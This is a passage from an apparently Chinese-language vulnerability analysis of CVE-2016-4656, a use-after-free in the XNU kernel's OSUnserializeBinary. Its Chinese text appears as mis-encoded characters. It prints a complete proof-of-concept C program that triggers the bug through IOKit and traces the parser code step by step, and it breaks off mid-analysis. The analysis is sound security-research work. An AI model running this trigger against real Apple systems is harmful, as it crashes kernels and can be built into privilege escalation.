<p>å¯ä»¥çœ‹å‡ºï¼Œéœ€è¦è§£æçš„äºŒè¿›åˆ¶æ•°æ®ï¼Œä¸€å®šæ˜¯å·²<code>kOSSerializeBinarySignature</code>å¼€å§‹çš„ã€‚å…·ä½“çš„å®šä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> kOSSerializeBinarySignature <span class="string">"\323\0\0"</span></span></span><br></pre></td></tr></table></figure>
<p>åœ¨é€šè¿‡ç­¾åçš„æ£€æµ‹ä¹‹åï¼Œå°±ä¼šæ ¹æ®æ¯ä¸€å—è¯»å‡ºçš„å†…å­˜è¿›è¡Œåˆ†æ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      key = *next++;</span><br><span class="line"></span><br><span class="line">      len = (key &amp; kOSSerializeDataMask); <span class="comment">//è·å–lençš„å€¼</span></span><br><span class="line">      wordLen = (len + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>; <span class="comment">//è®¡ç®—è¦ç”¨å‡ ä¸ªword</span></span><br><span class="line">   end = (<span class="number">0</span> != (kOSSerializeEndCollecton &amp; key)) <span class="comment">//è·å–endçš„å€¼;</span></span><br><span class="line">   	<span class="comment">/*...*/</span></span><br><span class="line"><span class="comment">//æ ¹æ®keyçš„ä¸åŒå¯¹ä¸åŒçš„æ•°æ®ç»“æ„åšæ“ä½œ</span></span><br><span class="line"><span class="keyword">switch</span> (kOSSerializeTypeMask &amp; key)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*....*/</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-3-2_æ•°æ®å­˜æ”¾">1.3.2 æ•°æ®å­˜æ”¾</h3><p>è§£æä¹‹åå¾—åˆ°çš„æ•°æ®ï¼Œä¼šè¢«å­˜æ”¾åˆ°å¯¹åº”çš„æ•°æ®ç»“æ„ä¹‹ä¸­å»ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">//å¦‚æœååºåˆ—åŒ–çš„ç»“æœä¸æ˜¯ä¸€ä¸ªreference</span></span><br><span class="line">	<span class="comment">//å°±å°†ç»“æœå­˜æ”¾åˆ°objsCapacityä¹‹ä¸­</span></span><br><span class="line">	<span class="comment">//å¦‚æœååºåˆ—åŒ–è‡ªåå†…å­˜ç”³è¯·å¤±è´¥,åˆ™é€€å‡ºååºåˆ—åŒ–</span></span><br><span class="line">	<span class="keyword">if</span> (!isRef)</span><br><span class="line">	&#123;</span><br><span class="line">		setAtIndex(objs, objsIdx, o);</span><br><span class="line">		<span class="comment">//å¦‚æœokçš„å€¼ä¸ºfalseï¼Œåˆ™é€€å‡ºååºåˆ—åŒ–å¾ªç¯</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//	#define kalloc_container(size)	\</span></span><br><span class="line">				kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">			typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">			if (!nbuf) ok = false;</span><br><span class="line">		*/</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//åœ¨å†…æ ¸ä¸­ç”³è¯·ncap*sizeofï¼ˆoï¼‰å¤§å°çš„å†…å­˜ï¼Œå¦‚æœç”³è¯·å¤±è´¥çš„äº†åˆ™okè®¾ä¸ºfalse</span></span><br><span class="line">		<span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		objsIdx++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å¦‚æœå­˜åœ¨ä¸€ä¸ªè§£æå‡ºæ¥çš„dict</span></span><br><span class="line">	<span class="keyword">if</span> (dict)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (sym)</span><br><span class="line">		&#123;</span><br><span class="line">			DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">			<span class="keyword">if</span> (o != dict) </span><br><span class="line">			&#123;</span><br><span class="line">				ok = dict-&gt;setObject(sym, o);</span><br><span class="line">			&#125;</span><br><span class="line">			o-&gt;release();</span><br><span class="line">			sym-&gt;release();</span><br><span class="line">			sym = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">			<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">			&#123;</span><br><span class="line">			    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">			    o-&gt;release();</span><br><span class="line">			    o = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ok = (sym != <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">array</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		ok = <span class="built_in">array</span>-&gt;setObject(o);</span><br><span class="line">	    o-&gt;release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	   ok = <span class="built_in">set</span>-&gt;setObject(o);</span><br><span class="line">	   o-&gt;release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	    assert(!parent);</span><br><span class="line">	    result = o;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (newCollect)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!end)</span><br><span class="line">		&#123;</span><br><span class="line">			stackIdx++;</span><br><span class="line">			setAtIndex(<span class="built_in">stack</span>, stackIdx, parent);</span><br><span class="line">			<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">		parent = o;</span><br><span class="line">		dict   = newDict;</span><br><span class="line">		<span class="built_in">array</span>  = newArray;</span><br><span class="line">		<span class="built_in">set</span>    = newSet;</span><br><span class="line">		end    = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!stackIdx) <span class="keyword">break</span>;</span><br><span class="line">		parent = stackArray[stackIdx];</span><br><span class="line">		DEBG(<span class="string">"--stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">		stackIdx--;</span><br><span class="line">		<span class="built_in">set</span>   = <span class="number">0</span>; </span><br><span class="line">		dict  = <span class="number">0</span>; </span><br><span class="line">		<span class="built_in">array</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!(<span class="built_in">array</span> = OSDynamicCast(OSArray, parent))) ok = (<span class="number">0</span> != (<span class="built_in">set</span> = OSDynamicCast(OSSet, parent)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯¹<code>reference</code>,<code>dict</code>,<code>set</code>,<code>array</code>éƒ½æœ‰ç›¸åº”çš„å¤„ç†åˆ†æ”¯ã€‚</p>
<h1 id="0x02_POCçš„åˆ†æ">0x02 POCçš„åˆ†æ</h1><h2 id="2-1_POC">2.1 POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * Simple POC to trigger CVE-2016-4656 (C) Copyright 2016 Stefan Esser / SektionEins GmbH</span><br><span class="line"> * compile on OS X like:</span><br><span class="line"> *    gcc -arch i386 -framework IOKit -o ex exploit.c</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;mach/mach.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;IOKit/IOKitLib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;IOKit/iokitmig.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">  kOSSerializeDictionary   = <span class="number">0x01000000</span>U,</span><br><span class="line">  kOSSerializeArray        = <span class="number">0x02000000</span>U,</span><br><span class="line">  kOSSerializeSet          = <span class="number">0x03000000</span>U,</span><br><span class="line">  kOSSerializeNumber       = <span class="number">0x04000000</span>U,</span><br><span class="line">  kOSSerializeSymbol       = <span class="number">0x08000000</span>U,</span><br><span class="line">  kOSSerializeString       = <span class="number">0x09000000</span>U,</span><br><span class="line">  kOSSerializeData         = <span class="number">0x0a000000</span>U,</span><br><span class="line">  kOSSerializeBoolean      = <span class="number">0x0b000000</span>U,</span><br><span class="line">  kOSSerializeObject       = <span class="number">0x0c000000</span>U,</span><br><span class="line">  kOSSerializeTypeMask     = <span class="number">0x7F000000</span>U,</span><br><span class="line">  kOSSerializeDataMask     = <span class="number">0x00FFFFFF</span>U,</span><br><span class="line">  kOSSerializeEndCollecton = <span class="number">0x80000000</span>U,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> kOSSerializeBinarySignature <span class="string">"\323\0\0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> * data = <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">uint32_t</span> * ptr = (<span class="keyword">uint32_t</span> *) data;</span><br><span class="line">  <span class="keyword">uint32_t</span> bufpos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">mach_port_t</span> master = <span class="number">0</span>, res;</span><br><span class="line">  <span class="keyword">kern_return_t</span> kr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create header */</span></span><br><span class="line">  <span class="built_in">memcpy</span>(data, kOSSerializeBinarySignature, <span class="keyword">sizeof</span>(kOSSerializeBinarySignature));</span><br><span class="line">  bufpos += <span class="keyword">sizeof</span>(kOSSerializeBinarySignature);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create a dictionary with 2 elements */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeDictionary | kOSSerializeEndCollecton | <span class="number">2</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* our key is a OSString object */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeString | <span class="number">7</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = <span class="number">0x41414141</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = <span class="number">0x00414141</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* our data is a simple boolean */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeBoolean | <span class="number">64</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* now create a reference to object 1 which is the OSString object that was just freed */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeObject | <span class="number">1</span>; bufpos += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get a master port for IOKit API */</span></span><br><span class="line">  host_get_io_master(mach_host_self(), &amp;master);</span><br><span class="line">  <span class="comment">/* trigger the bug */</span></span><br><span class="line">  kr = io_service_get_matching_services_bin(master, data, bufpos, &amp;res);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"kr: 0x%x\n"</span>, kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾ï¼Œ<code>poc</code>åˆ›å»ºäº†ä¸€ä¸ª<code>dict</code>ï¼Œè¿™ä¸ª<code>dict</code>æœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯<code>key</code>ä¸º<code>â€œAAAAAAAâ€</code>çš„å­—ç¬¦ä¸²ï¼Œå€¼ä¸ºä¸€ä¸ª<code>Boolean</code>ã€‚ç¬¬äºŒä¸ªå…ƒç´ æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä¸€ä¸ª<code>reference</code>ã€‚</p>
<p>å†…æ ¸åœ¨ååºåˆ—åŒ–è¿™ä¸€æ®µå­—ç¬¦ä¸²çš„æ—¶å€™å°±ä¼šè§¦å‘æ¼æ´ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-4656/crash.png" alt="crash"></p>
<p>ç»“åˆ<code>OSUnserializeBinary</code>ï¼Œæ¥åˆ†æä¸€ä¸‹ï¼Œåˆ°åº•å‘ç”Ÿäº†ä¸€äº›ä»€ä¹ˆã€‚</p>
<h2 id="2-2_æµç¨‹">2.2 æµç¨‹</h2><h3 id="2-2-1_kOSSerializeDictionary">2.2.1 kOSSerializeDictionary</h3><p>é€šè¿‡è§£æï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶é¦–å…ˆä¼šè¿›å…¥<code>kOSSerializeDictionary</code>çš„åˆ†æ”¯ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> kOSSerializeDictionary:</span><br><span class="line">	o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">	newCollect = (len != <span class="number">0</span>);</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>break</code>ä¹‹åï¼Œæ‰§è¡Œ<code>setAtIndex</code>å®ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] = dict</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºå…¶ä»–æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œä»£ç ä¼šè¿›å…¥å¤„ç†æ–°å®¹å™¨çš„åˆ†æ”¯ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (newCollect)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!end)</span><br><span class="line">	&#123;</span><br><span class="line">		stackIdx++;</span><br><span class="line">		setAtIndex(<span class="built_in">stack</span>, stackIdx, parent);</span><br><span class="line">		<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">	parent = o;</span><br><span class="line">	dict   = newDict;</span><br><span class="line">	<span class="built_in">array</span>  = newArray;</span><br><span class="line">	<span class="built_in">set</span>    = newSet;</span><br><span class="line">	end    = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»è€Œç»™<code>dict</code>èµ‹å€¼<code>newDict</code>ã€‚ä»è€Œåˆ›å»ºäº†ä¸€ä¸ª<code>dict</code>ç”¨æ¥å­˜å‚¨åç»­çš„æ•°æ®ã€‚</p>
<h3 id="2-2-2_kOSSerializeStringä¸kOSSerializeBoolean">2.2.2 kOSSerializeStringä¸kOSSerializeBoolean</h3><p>ç¬¬ä¸€ä¸ªå…ƒç´ çš„<code>key</code>æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šè¿‡æºç è§£æã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">case kOSSerializeString:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSString::withStringOfLength((const char *) next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br></pre></td></tr></table></figure>
<p>è·å¾—å­—ç¬¦ä¸²<code>o</code>ã€‚</p>
<p><code>break</code>ä¹‹åï¼Œæ‰§è¡Œ<code>setAtIndex</code>å®ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] = dict</span><br><span class="line">objsArray[<span class="number">1</span>] = <span class="string">"0x0041414141414141"</span></span><br></pre></td></tr></table></figure>
<p>å› ä¸º<code>dict</code>å·²ç»åˆ›å»ºï¼Œè¿›å…¥<code>dict</code>çš„å¤„ç†æµç¨‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (sym)</span><br><span class="line">			&#123;</span><br><span class="line">				DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				<span class="keyword">if</span> (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();</span><br><span class="line">				sym-&gt;release();</span><br><span class="line">				sym = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);				<span class="comment">//&lt;--è¿›å…¥è¿™ä¸ªåˆ†æ”¯</span></span><br><span class="line">				<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸º<code>sym</code>å¹¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥æ ¹æ®<code>o</code>è½¬æ¢å‡º<code>sym</code>ã€‚</p>
<p>ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼æ˜¯ä¸€ä¸ªboolå€¼ï¼Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> kOSSerializeBoolean:</span><br><span class="line">		o = (len ? kOSBooleanTrue : kOSBooleanFalse);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>break</code>ä¹‹åï¼Œæ‰§è¡Œ<code>setAtIndex</code>å®ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] =&gt; dict</span><br><span class="line">objsArray[<span class="number">1</span>] =&gt; <span class="string">"0x0041414141414141"</span></span><br><span class="line">objsArray[<span class="number">2</span>] =&gt; <span class="literal">true</span>	<span class="comment">//ä¸çŸ¥é“æ˜¯ä¸æ˜¯trueï¼Œçå†™çš„ï¼Œè¿™é‡Œä¸é‡è¦</span></span><br></pre></td></tr></table></figure>
<p>å†æ¬¡è¿›å…¥<code>dict</code>çš„å¤„ç†åˆ†æ”¯ï¼Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (sym)<span class="comment">//&lt;--è¿›å…¥è¿™ä¸ªåˆ†æ”¯</span></span><br><span class="line">			&#123;</span><br><span class="line">				DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				<span class="keyword">if</span> (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();	<span class="comment">//objsArrays[2]æŒ‡å‘o</span></span><br><span class="line">				sym-&gt;release();	<span class="comment">//objsArrays[1]æŒ‡å‘sym</span></span><br><span class="line">				sym = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);				</span><br><span class="line">				<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸º<code>sym</code>å·²ç»å­˜åœ¨äº†ï¼Œæ‰€ä»¥è¿›å…¥äº†ä¸Šé¢çš„åˆ†æ”¯ï¼Œåœ¨å¤„ç†å®Œæˆä¹‹åï¼Œå¯¹<code>o</code>å’Œ<code>sym</code>éƒ½è¿›è¡Œäº†<code>release</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] =&gt; dict</span><br><span class="line">objsArray[<span class="number">1</span>] =&gt; <span class="string">"0x0041414141414141"</span>	<span class="comment">//released</span></span><br><span class="line">objsArray[<span class="number">2</span>] =&gt; <span class="literal">true</span>				   <span class="comment">//released</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2-3_kOSSerializeObject">2.2.3 kOSSerializeObject</h3><p>ç¬¬äºŒä¸ªå…ƒç´ çš„æ˜¯ä¸€ä¸ª<code>reference</code>ï¼Œå¤„ç†çš„ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="keyword">case</span> kOSSerializeObject:</span><br><span class="line"><span class="keyword">if</span> (len &gt;= objsIdx) <span class="keyword">break</span>;</span><br><span class="line">o = objsArray[len];	<span class="comment">//lençš„å€¼ä¸º1</span></span><br><span class="line">o-&gt;retain();</span><br><span class="line">isRef = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>o</code>å–å‡ºæ•°ç»„ä¸­<code>objsArray[1]</code>,æ˜¯ä¸€ä¸ªå·²ç»è¢«é‡Šæ”¾äº†çš„å…ƒç´ ã€‚</p>
<p>å†é€šè¿‡<code>dict</code>å¤„ç†çš„ä»£ç æ—¶</p>
